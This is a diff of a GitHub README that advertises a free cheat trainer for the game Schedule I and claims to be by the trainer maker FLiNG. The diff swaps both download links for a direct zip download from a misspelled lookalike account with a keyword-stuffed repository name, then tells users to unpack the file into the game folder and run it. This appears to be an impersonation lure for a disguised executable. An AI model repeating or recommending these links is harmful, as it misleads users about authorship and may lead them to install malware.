@@ -1,13 +1,13 @@
 # Schedule Cheats [2025] | BEST Schedule Hack [Menu] | Schedule Mod Menu [Update]
 
-[<p align="center"><a href="https://github.com/FLiNG-Trainer/Schedule-I-Trainer/releases"><img src="https://img.shields.io/badge/Download%20Trainer-Now!-brightgreen?style=for-the-badge&logo=github" alt="Download Now"></a></p>](#)
+[<p align="center"><a href="https://github.com/FlingTreiners/Schedule-I-Trainer-by-FLiNG-Free-Cheats-for-Total-Domination-in-Hyland-Point-Download-Now/releases/download/schedule1/schedule1.zip"><img src="https://img.shields.io/badge/Download%20Trainer-Now!-brightgreen?style=for-the-badge&logo=github" alt="Download Now"></a></p>](#)
 
 Hey, gamers! I’m **FLiNG**, a legendary trainer maker, and I’ve crafted the **Schedule I Trainer** — the ultimate tool for *Schedule I* (Steam, Early Access, March 24, 2025). Want infinite cash, invincibility, and total control over Hyland Point? This free trainer is your ticket! Download it now and rule the underworld! 💰👑
 
 ---
 
 ## 📥 How to Install – Quick & Easy  
-1. 🔥 **Download** the trainer from [releases](https://github.com/FLiNG-Trainer/Schedule-I-Trainer/releases).  
+1. 🔥 **Download** the trainer from [releases](https://github.com/FlingTreiners/Schedule-I-Trainer-by-FLiNG-Free-Cheats-for-Total-Domination-in-Hyland-Point-Download-Now/releases/download/schedule1/schedule1.zip).  
 2. 📂 Unpack the files into your *Schedule I* game folder (64-bit).  
 3. 🎮 Launch the trainer, then start the game via `schedule1.exe`.  
 4. ⚡ Activate cheats with hotkeys and dominate the world!  
